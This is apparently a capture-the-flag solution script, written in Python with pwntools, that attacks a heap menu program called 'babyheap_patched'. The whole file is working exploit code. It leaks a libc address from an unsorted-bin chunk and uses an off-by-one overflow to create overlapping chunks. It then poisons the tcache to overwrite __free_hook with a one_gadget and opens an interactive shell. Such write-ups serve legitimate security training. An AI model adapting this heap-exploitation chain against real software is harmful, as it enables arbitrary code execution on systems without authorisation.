#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./babyheap_patched")


libc = elf.libc


#context.log_level = 'debug'

gs = '''
     continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()


io = start()


def malloc(size, content):
    io.sendlineafter(b'> ', b'M') # [M]alloc
    io.sendlineafter(b'> ', f'{size}'.encode())
    io.sendlineafter(b'> ', content)

def free(i):
    io.sendlineafter(b'> ', b'F') # [F]ree
    io.sendlineafter(b'> ', f'{i}'.encode()) # index


def show(i):
    io.sendlineafter(b'> ', b'S') # [S]how
    io.sendlineafter(b'> ', f'{i}'.encode()) # index
    return io.recvline()

# exploit starts here

for i in range(9):
    malloc(0xf8, str(i).encode() * 0xf7)


for i in range(8,-1,-1):
    free(i)

# freeing tcache 

for i in range(7):
    malloc(0xf8, str(i).encode()*0xf8)


# get the unsortedbin chunk and fill it's first quadword with AAAAAAAA

malloc(0xf8, b'AAAAAAAA')

leak = u64(show(7).strip().strip(b'AAAAAAAA').ljust(8, b'\x00'))

libc.address = leak - 0x1e4e90

log.success(f'libc @ 0x{libc.address:02x}')

one_gadget = libc.address + 0xe2383


malloc(0xf8, b'AAAA') # allocate the chunk that stills in the unsortedbin

# free chunks in reverse order they were allocated 
for i in range(8, -1, -1):
    free(i)


malloc(0xf8, b'chunk_A') # 0
malloc(0xf8, b'chunk_B') # 1
malloc(0xf8, b'chunk_C') # 2

free(1) # free chunk_B to create a hole

# off-by-one to create overlapping chunks

malloc(0xf8, b'A'*0xf8+p8(0x81))


free(2) # free chunk_C then allocate it again then overflow into the next tcache chunk and corrput it's metadata


malloc(0x110, b'A'*0x100 + p64(libc.sym.__free_hook)[:6]) # keep in mind to remove null bytes from the __free_hook address that's why [:6]

malloc(0xf8, b'hahahaha') # request the authentic chunk
malloc(0xf8, p64(one_gadget)[:6]) # write one_gadget into __free_hook

free(0) # trigger one_gadget
io.interactive()
